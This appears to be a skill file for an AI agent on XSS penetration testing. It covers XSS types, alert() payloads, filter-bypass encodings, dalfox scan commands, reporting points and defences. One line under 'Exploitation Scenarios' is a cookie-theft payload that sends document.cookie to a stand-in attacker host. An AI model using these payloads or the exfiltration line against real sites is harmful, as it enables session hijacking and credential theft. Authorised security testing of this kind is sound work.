---
name: xss-testing
description: Professional skills for XSS cross-site scripting attack testing
version: 1.0.0
---

# XSS Testing Skills

## Overview

Cross-Site Scripting (XSS) allows attackers to execute malicious JavaScript code in victims' browsers. This skill covers testing methods for reflected, stored, and DOM-based XSS.

## XSS Types

### 1. Reflected XSS
- Malicious scripts are passed via URL parameters
- The server directly returns a response containing the script
- Requires the user to click a malicious link

### 2. Stored XSS
- Malicious scripts are stored on the server (database, files, etc.)
- All users who visit the affected page will execute the script
- Wider scope of impact

### 3. DOM-based XSS
- Client-side JavaScript improperly handles user input
- Does not involve server-side processing
- Triggered by modifying DOM structure

## Testing Methods

### Basic Payload
```javascript
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>
```

### Bypass Filtering

#### Case Bypass
```javascript
<ScRiPt>alert('XSS')</ScRiPt>
```

#### Encoding Bypass
```javascript
%3Cscript%3Ealert('XSS')%3C/script%3E
&#60;script&#62;alert('XSS')&#60;/script&#62;
```

#### Event Handlers
```javascript
<img src=x onerror=alert(String.fromCharCode(88,83,83))>
<div onmouseover=alert('XSS')>hover</div>
<input onfocus=alert('XSS') autofocus>
```

#### Pseudo-protocols
```javascript
<a href="javascript:alert('XSS')">click</a>
<iframe src="javascript:alert('XSS')">
```

### Advanced Bypass Techniques

#### Using String.fromCharCode
```javascript
<script>alert(String.fromCharCode(88,83,83))</script>
```

#### Using eval and atob
```javascript
<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>
```

#### Using HTML entities
```javascript
&#60;script&#62;alert('XSS')&#60;/script&#62;
```

## Tool Usage

### dalfox
```bash
# Basic scan
dalfox url "http://target.com/page?q=test"

# Specify parameter
dalfox url "http://target.com/page" -d "q=test" -X POST

# Use custom payload
dalfox url "http://target.com/page?q=test" --custom-payload payloads.txt
```

### Burp Suite
- Use Intruder module for batch testing
- Use Repeater for manual testing
- Use Scanner for automatic detection

### Browser Console
- Test DOM-based XSS
- Check JavaScript execution environment
- Debug payloads

## Validation and Exploitation

### Validation Steps
1. Confirm payload is executed
2. Check if it is filtered or encoded
3. Test different contexts (HTML, JavaScript, attributes, etc.)
4. Assess impact (cookie theft, session hijacking, etc.)

### Exploitation Scenarios
- Cookie theft: `<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>`
- Keylogging: Inject keyboard event listeners
- Phishing attack: Forge login forms
- Session hijacking: Obtain user session token

## Reporting Key Points

- XSS type (Reflected/Stored/DOM)
- Trigger location and parameters
- Complete POC
- Impact assessment
- Remediation recommendations (output encoding, CSP policy, etc.)

## Protective Measures

- Input validation and filtering
- Output encoding (HTML, JavaScript, URL)
- Content Security Policy (CSP)
- HttpOnly Cookie flag
- Use secure frameworks and libraries
